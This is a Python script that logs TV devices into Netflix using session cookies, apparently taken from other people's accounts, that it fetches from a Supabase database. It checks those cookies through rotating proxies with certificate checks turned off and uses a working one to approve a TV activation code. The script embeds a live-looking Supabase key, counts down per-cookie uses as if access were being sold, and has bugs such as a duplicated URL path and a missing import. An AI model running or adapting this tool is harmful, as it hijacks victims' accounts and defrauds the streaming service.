#!/usr/bin/env python3
"""
Netflix TV Code Auto-Login v2.0 - Supabase Version (Pure Requests)
No extra 'supabase' library needed
"""

import os
import random
import re
import sys
import urllib.parse
from datetime import datetime, timezone

import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ============= SUPABASE CONFIG =============
SUPABASE_URL = "https://omzmzjptwjqxvjfxtcaf.supabase.co"
SUPABASE_URL = "https://omzmzjptwjqxvjfxtcaf.supabase.co/rest/v1/"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9tem16anB0d2pxeHZqZnh0Y2FmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM4Njg4ODMsImV4cCI6MjA4OTQ0NDg4M30.OcsiYdjQ6qWQkr4diIfCAzV2cpptH4R9xulcuAKVxqM"
SERVICE_TYPE = "netflix"   # ← Change only if you use a different service_type

# ── Config ─────────────────────────────────────────────────────────
COOKIES_FOLDER = "cookies"
FAILED_FOLDER = "failed"
PROXY_FILE = "proxy.txt"
REQUEST_TIMEOUT = 15
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

REQUIRED_COOKIES = ("NetflixId",)
OPTIONAL_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_COOKIE_NAMES = set(REQUIRED_COOKIES + OPTIONAL_COOKIES)
CANONICAL_NAMES = {name.lower(): name for name in ALL_COOKIE_NAMES}

# ============= SUPABASE COOKIE FETCHER (PURE REQUESTS) =============
# ============= DEBUG VERSION - SUPABASE COOKIE FETCHER =============
def get_random_vamt_cookie():
    """Debug version - prints what Supabase actually returns"""
    try:
        headers = {
            "apikey": SUPABASE_KEY,
            "Authorization": f"Bearer {SUPABASE_KEY}",
            "Content-Type": "application/json",
        }

        url = f"{SUPABASE_URL}/rest/v1/vamt_keys"
        params = {
            "limit": "10"   # small limit for debug
        }

        print("🔍 Sending request to Supabase...")
        r = requests.get(url, headers=headers, params=params, timeout=15)
        
        print(f"📡 Status Code: {r.status_code}")
        
        if r.status_code != 200:
            print(f"❌ Error response: {r.text[:500]}")
            return None

        data = r.json()
        print(f"📊 Found {len(data)} rows in total")

        if not data:
            print("⚠️ Table is empty or no rows returned")
            return None

        # Show first row for debugging
        print("🔎 First row example:")
        print(data[0])

        # Now try to find Netflix cookies
        netflix_rows = [row for row in data if "netflix" in str(row.get("key_id", "")).lower()]

        print(f"🔎 Found {len(netflix_rows)} rows containing 'netflix'")

        if not netflix_rows:
            print("❌ No rows contain 'netflix' in key_id")
            return None

        row = random.choice(netflix_rows)
        cookie_data = row["key_id"]

        print(f"✅ Using cookie: {row.get('display_name') or 'Netflix Cookie'}")

        # Consume 1 use
        new_remaining = max(0, int(row.get("remaining", 1)) - 1)
        update_url = f"{SUPABASE_URL}/rest/v1/vamt_keys?key_id=eq.{row['key_id']}"
        update_data = {"remaining": new_remaining, "last_updated": datetime.now(timezone.utc).isoformat()}
        requests.patch(update_url, headers=headers, json=update_data, timeout=10)

        return {"key_id": row["key_id"], "cookie_data": cookie_data}

    except Exception as e:
        print(f"❌ Supabase error: {e}")
        return None

# ══════════════════════════════════════════════════════════════════════
#  PROXY
# ══════════════════════════════════════════════════════════════════════

def parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None

    line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", line)
    line = re.sub(r"\s+", " ", line).strip()

    m = re.match(
        r"^(?P<scheme>https?|socks5h?|socks4a?)://"
        r"(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?"
        r"(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$",
        line, re.IGNORECASE,
    )
    if m:
        d = m.groupdict()
        host = d["host"].strip().strip("[]")
        if d.get("user") and d.get("password"):
            url = f"{d['scheme']}://{d['user']}:{d['password']}@{host}:{d['port']}"
        else:
            url = f"{d['scheme']}://{host}:{d['port']}"
        return {"http": url, "https": url}

    m = re.match(r"^(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@(?P<host>[^:\s]+):(?P<port>\d+)$", line)
    if m:
        d = m.groupdict()
        url = f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"
        return {"http": url, "https": url}

    m = re.match(r"^(?P<host>[^:\s]+):(?P<port>\d+)@(?P<user>[^:@\s]+):(?P<password>[^@\s]+)$", line)
    if m:
        d = m.groupdict()
        url = f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"
        return {"http": url, "https": url}

    m = re.match(r"^(?P<host>[^:\s]+):(?P<port>\d+)$", line)
    if m:
        d = m.groupdict()
        url = f"http://{d['host']}:{d['port']}"
        return {"http": url, "https": url}

    parts = line.split(":")
    if len(parts) == 4:
        a, b, c, d = parts
        if b.isdigit() and not d.isdigit():
            url = f"http://{c}:{d}@{a}:{b}"
            return {"http": url, "https": url}
        if d.isdigit() and not b.isdigit():
            url = f"http://{a}:{b}@{c}:{d}"
            return {"http": url, "https": url}

    for sep in (r"\s+", r"\|", r";", r","):
        m = re.match(rf"^(?P<host>[^:\s]+):(?P<port>\d+){sep}(?P<user>[^:\s]+):(?P<password>\S+)$", line)
        if m:
            d = m.groupdict()
            url = f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"
            return {"http": url, "https": url}
    return None


def load_proxies():
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            for line in f:
                p = parse_proxy_line(line)
                if p:
                    proxies.append(p)
    return proxies


# ══════════════════════════════════════════════════════════════════════
#  COOKIE EXTRACTION
# ══════════════════════════════════════════════════════════════════════

def canonicalize_name(name):
    return CANONICAL_NAMES.get(str(name or "").strip().lower(), str(name or "").strip())


def is_netflix_cookie(domain, name):
    return canonicalize_name(name) in ALL_COOKIE_NAMES or "netflix." in str(domain or "").lower()


def split_netscape_line(line):
    line = line.strip()
    if not line or (line.startswith("#") and not line.startswith("#HttpOnly_")):
        return None
    if line.startswith("#HttpOnly_"):
        line = line[len("#HttpOnly_"):]
    parts = line.split("\t")
    if len(parts) >= 7:
        return parts[:6] + ["\t".join(parts[6:])]
    parts = re.split(r"\s+", line, maxsplit=6)
    return parts if len(parts) >= 7 else None


def is_netscape_line(line):
    parts = split_netscape_line(line)
    if not parts:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    if not re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()):
        return False
    return True


def extract_netscape_entries(raw_text):
    entries = []
    for line in raw_text.splitlines():
        if not is_netscape_line(line):
            continue
        parts = split_netscape_line(line)
        domain, _, path, secure, expires, name, value = parts[0], parts[1], parts[2], parts[3], parts[4], parts[5], parts[6]
        name = canonicalize_name(name)
        if not is_netflix_cookie(domain, name):
            continue
        entries.append({"domain": domain.replace("#HttpOnly_", "", 1), "name": name, "value": value})
    return entries


def extract_json_entries(content):
    try:
        data = __import__("json").loads(content)
    except Exception:
        return []
    if isinstance(data, dict):
        data = data.get("cookies") or data.get("items") or [data]
    if not isinstance(data, list):
        return []
    entries = []
    for cookie in data:
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = canonicalize_name(cookie.get("name", ""))
        if not is_netflix_cookie(domain, name):
            continue
        entries.append({"domain": domain, "name": name, "value": cookie.get("value", "")})
    return entries


def extract_raw_entries(raw_text):
    pattern = re.compile(
        r"(?:['\"])?(?P<name>" + "|".join(sorted(ALL_COOKIE_NAMES, key=len, reverse=True)) +
        r")(?:['\"])?\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)",
        re.IGNORECASE,
    )
    entries = []
    for m in pattern.finditer(raw_text):
        name = canonicalize_name(m.group("name"))
        value = m.group("value")
        if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}:
            value = value[1:-1]
        else:
            value = value.rstrip(",")
        entries.append({"domain": ".netflix.com", "name": name, "value": value})
    return entries


def extract_cookie_dict(content: str):
    """Now accepts string from Supabase"""
    for extractor in (extract_json_entries, extract_netscape_entries, extract_raw_entries):
        entries = extractor(content)
        if entries:
            break
    else:
        return None

    cookies = {}
    for e in entries:
        if e["name"] not in cookies:
            cookies[e["name"]] = e["value"]
    return cookies if "NetflixId" in cookies else None

# ══════════════════════════════════════════════════════════════════════
#  COOKIE VALIDATION
# ══════════════════════════════════════════════════════════════════════

def validate_cookie(cookies, proxy=None):
    session = requests.Session()
    session.cookies.update(cookies)
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    try:
        r = session.get(
            "https://www.netflix.com/account/membership",
            headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False,
        )
        if r.status_code != 200:
            return False, None, None
        country = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', r.text)
        if not country:
            country = re.search(r'"countryOfSignup":\s*"([^"]+)"', r.text)
        if not country:
            return False, None, None
        plan = re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', r.text)
        plan = plan.group(1) if plan else "Unknown"
        return True, country.group(1), plan
    except Exception:
        return False, None, None


# ══════════════════════════════════════════════════════════════════════
#  HTML CLEANER
# ══════════════════════════════════════════════════════════════════════

def clean_html(html_text):
    text = re.sub(r'<script[^>]*>.*?</script>', '', html_text, flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r'<noscript[^>]*>.*?</noscript>', '', text, flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r'<svg[^>]*>.*?</svg>', '', text, flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r'<br\s*/?>', '\n', text, flags=re.IGNORECASE)
    text = re.sub(r'<[^>]+>', ' ', text)
    text = urllib.parse.unquote(text)
    text = text.replace('&amp;', '&').replace('&lt;', '<').replace('&gt;', '>')
    text = text.replace('&quot;', '"').replace('&#x27;', "'").replace('&#39;', "'")
    text = text.replace('&nbsp;', ' ').replace('\u00A0', ' ')
    text = re.sub(r'\s+', ' ', text).strip()
    lines = [l.strip() for l in text.split('\n') if l.strip()]
    return '\n'.join(lines)


# ══════════════════════════════════════════════════════════════════════
#  TV ACTIVATION
# ══════════════════════════════════════════════════════════════════════

# Error patterns in multiple languages that mean the code was rejected
TV_CODE_ERROR_PATTERNS = [
    # English
    r"that code wasn'?t right",
    r"code (is )?(incorrect|invalid|wrong)",
    r"try again",
    r"code you entered is",
    # Spanish
    r"c[oó]digo (es |que ingresaste |no es |incorrecto|inv[aá]lido)",
    r"ese c[oó]digo no",
    r"int[ée]ntalo de nuevo",
    r"intenta (de )?nuevo",
    # Portuguese
    r"c[oó]digo (est[aá] |n[aã]o est[aá] |incorreto|inv[aá]lido)",
    r"esse c[oó]digo n[aã]o",
    r"tente novamente",
    # French
    r"code (est |n'est pas |incorrect|invalide)",
    r"ce code n'est",
    r"r[ée]essayez",
    r"essayez encore",
    r"veuillez r[ée]essayer",
    # German
    r"code (ist |ung[uü]ltig|falsch)",
    r"versuchen sie es erneut",
    r"erneut versuchen",
    # Italian
    r"codice (non [eè] |sbagliato|non valido)",
    r"riprova",
    r"riprovare",
    # Turkish
    r"kod (yanlış|ge[çc]ersiz|hatalı|doğru değil)",
    r"tekrar dene",
    # Arabic
    r"الرمز (غير صحيح|خطأ|خاطئ)",
    r"حاول مرة أخرى",
    r"المُدخل غير",
    # Hebrew
    r"הקוד (שהזנת |שגוי|לא נכון)",
    r"כדאי לנסות שוב",
    r"נסה שוב",
    # Vietnamese
    r"m[ãa] (đó|không đúng|không ch[íi]nh x[áa]c|sai)",
    r"thử lại",
    # Polish
    r"kod (jest |nieprawidłowy|błędny)",
    r"spr[óo]buj ponownie",
    # Indonesian
    r"kode (salah|tidak valid|tidak tepat)",
    r"coba lagi",
    # Thai
    r"รหัส(ที่คุณป้อน)?(ไม่ถูกต้อง|ผิด)",
    r"ลองอีกครั้ง",
    # Korean
    r"코드(가|는)?(잘못|틀렸|올바르지 않)",
    r"다시 시도",
    # Japanese
    r"コード(が|は)?(間違|違|正しく)",
    r"もう一度",
    # Hindi
    r"कोड (गलत|अमान्य)",
    r"पुनः प्रयास",
    r"फिर से",
    # Dutch
    r"code (is |niet |onjuist|verkeerd)",
    r"probeer opnieuw",
    # Romanian
    r"codul (este |nu este |incorect|gre[sș]it)",
    r"[iî]ncearc[aă] din nou",
    # Hungarian
    r"a k[oó]d (hib[aá]s|nem megfelel)",
    r"pr[oó]b[aá]ld [uú]jra",
    # Greek
    r"ο κωδικ[οό]ς (είναι |δεν είναι |λάθος|εσφαλμέν)",
    r"δοκιμ[άα]στε ξαν[άα]",
    # Swedish
    r"koden (är |stämmer inte |felaktig|ogiltig)",
    r"f[oö]rs[oö]k igen",
    # Norwegian
    r"koden (er |stemmer ikke |feil|ugyldig)",
    r"pr[oø]v igjen",
    # Danish
    r"koden (er |er ikke |forkert|ugyldig)",
    r"pr[oø]v igen",
    # Finnish
    r"koodi (on |ei ole |virheellinen|v[aä][aä]r[aä])",
    r"yrit[aä] uudelleen",
    # Czech
    r"k[oó]d (je |nen[íi] |nespr[aá]vn[yý]|chybn[yý])",
    r"zkuste to znovu",
    # Russian
    r"код (неверный|неправильный|ошибочный)",
    r"попробуйте (еще раз|снова)",
    # Ukrainian
    r"код (нев[іи]рний|неправильний|помилковий)",
    r"спробуйте (ще раз|знову)",
    # Chinese (Simplified)
    r"代码(有误|错误|无效|不正确)",
    r"请重试",
    r"再试一[次遍]",
    # Chinese (Traditional)
    r"代碼(有誤|錯誤|無效|不正確)",
    r"請重試",
    r"再試一[次遍]",
    # Malay
    r"kod (salah|tidak sah|tidak betul)",
    r"cuba lagi",
    # Filipino/Tagalog
    r"code (ay |mali|hindi tama)",
    r"subukan muli",
]


def is_tv_code_error(cleaned_text, final_url):
    """Check if the response indicates the TV code was rejected."""
    text_lower = cleaned_text.lower()
    for pattern in TV_CODE_ERROR_PATTERNS:
        if re.search(pattern, text_lower):
            return True
    return False


def is_tv_code_success(final_url, cleaned_text):
    """Check if the TV code was accepted."""
    # Primary: check the redirect URL
    if "/tv/out/success" in final_url.lower():
        return True

    # Secondary: check page text for success indicators
    success_patterns = [
        r"tu tv est[aá] lista",
        r"your tv is ready",
        r"sua tv est[aá] pronta",
        r"votre t[ée]l[ée] est pr[eê]t",
        r"dein tv ist bereit",
        r"la tua tv [eè] pronta",
        r"tv'niz hazır",
        r"televizyonunuz hazır",
        r"הטלוויזיה שלך מוכנ",
        r"تلفازك جاهز",
        r"tv của bạn đã sẵn sàng",
        r"tw[oó]j telewizor jest gotowy",
    ]
    text_lower = cleaned_text.lower()
    for pat in success_patterns:
        if re.search(pat, text_lower):
            return True

    return False


def extract_auth_url(html):
    patterns = [
        r'name="authURL"\s+value="([^"]+)"',
        r'authURL["\']?\s*[:=]\s*["\']([^"]+)["\']',
        r'authURL=([^&\s"\']+)',
        r'["\']authURL["\']\s*:\s*["\']([^"\']+)["\']',
        r'value="(c1\.[^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, html)
        if m:
            return urllib.parse.unquote(m.group(1))
    return None


def submit_tv_code(session, tv_code, proxy=None):
    url = "https://www.netflix.com/tv8"
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    }

    # Step 1: GET
    try:
        r = session.get(url, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code != 200:
            return {"success": False, "error": f"GET /tv8 returned {r.status_code}"}
    except Exception as e:
        return {"success": False, "error": f"GET /tv8 failed: {e}"}

    auth_url = extract_auth_url(r.text)
    if not auth_url:
        fallback = re.search(r'c1\.[a-zA-Z0-9%+=/]+', r.text)
        if fallback:
            auth_url = fallback.group(0)
        else:
            return {"success": False, "error": "Could not extract authURL from page"}

    # Step 2: POST
    form_data = {
        "flow": "websiteSignUp",
        "authURL": auth_url,
        "flowMode": "enterTvLoginRendezvousCode",
        "withFields": "tvLoginRendezvousCode,isTvUrl2",
        "code": tv_code,
        "tvLoginRendezvousCode": tv_code,
        "action": "nextAction",
    }

    post_headers = {
        **headers,
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://www.netflix.com/tv8",
        "Origin": "https://www.netflix.com",
    }

    try:
        r = session.post(
            url, data=form_data, headers=post_headers,
            proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False,
            allow_redirects=True,
        )
    except Exception as e:
        return {"success": False, "error": f"POST /tv8 failed: {e}"}

    final_url = r.url if hasattr(r, 'url') else url
    cleaned = clean_html(r.text)

    if is_tv_code_success(final_url, cleaned):
        return {
            "success": True,
            "error": None,
            "final_url": final_url,
            "status_code": r.status_code,
            "page_text": cleaned,
        }

    if is_tv_code_error(cleaned, final_url):
        return {
            "success": False,
            "error": "TV code rejected (invalid/expired)",
            "final_url": final_url,
            "status_code": r.status_code,
            "page_text": cleaned,
        }

    return {
        "success": False,
        "error": "Unknown response",
        "final_url": final_url,
        "status_code": r.status_code,
        "page_text": cleaned,
    }


# ══════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════

def move_to_failed(src_path, filename, reason):
    try:
        safe = re.sub(r"[^a-z0-9]+", "_", str(reason).strip().lower()).strip("_") or "unknown"
        name, ext = os.path.splitext(filename)
        dest = os.path.join(FAILED_FOLDER, f"{safe}__{name}{ext}")
        if os.path.exists(dest):
            suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))
            dest = os.path.join(FAILED_FOLDER, f"{safe}__{name}_{suffix}{ext}")
        os.rename(src_path, dest)
    except Exception:
        pass


def main():
    print("=" * 60)
    print("  Netflix TV Code Auto-Login v2.0 - Supabase Edition")
    print("=" * 60)
    print(f"Service Type : {SERVICE_TYPE}")
    print()

    os.makedirs(FAILED_FOLDER, exist_ok=True)

    proxies = load_proxies()
    if proxies:
        print(f"[*] Proxies loaded: {len(proxies)}")
    else:
        print("[*] No proxies (direct connection)")

    tv_code = input("\n[?] Enter TV activation code: ").strip()
    if not tv_code:
        print("[!] No code entered. Exiting.")
        return

    tv_code_clean = re.sub(r'\D', '', tv_code)
    if len(tv_code_clean) != 8:
        print(f"[!] TV code must be exactly 8 digits.")
        return

    print(f"[*] Looking for a working cookie to activate: {tv_code_clean}\n")

    attempts = 0
    max_attempts = 100

    while attempts < max_attempts:
        attempts += 1
        print(f"[{attempts}] Fetching cookie from Supabase... ", end="", flush=True)

        cookie_info = get_random_vamt_cookie()
        if not cookie_info:
            print("❌ No more cookies available!")
            break

        content = cookie_info["cookie_data"]
        cookies = extract_cookie_dict(content)

        if not cookies:
            print("SKIP (no NetflixId)")
            continue

        proxy = random.choice(proxies) if proxies else None
        valid, country, plan = validate_cookie(cookies, proxy)

        if not valid:
            print("DEAD")
            continue

        print(f"VALID | {country} | {plan}")

        session = requests.Session()
        session.cookies.update(cookies)
        result = submit_tv_code(session, tv_code_clean, proxy)

        if result["success"]:
            print(f"\n{'=' * 60}")
            print("  ✅ TV ACTIVATED SUCCESSFULLY!")
            print(f"  {'=' * 60}")
            print(f"  Account: {country} | {plan}")
            print(f"  Code   : {tv_code_clean}")
            print(f"  {'=' * 60}")
            return
        else:
            print(f"  -> {result['error']}")

    print(f"\n{'=' * 60}")
    print("  ❌ All available cookies exhausted or failed.")
    print(f"  Code: {tv_code_clean}")
    print(f"  {'=' * 60}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Stopped by user.")
    except Exception as e:
        print(f"\n❌ Fatal Error: {e}")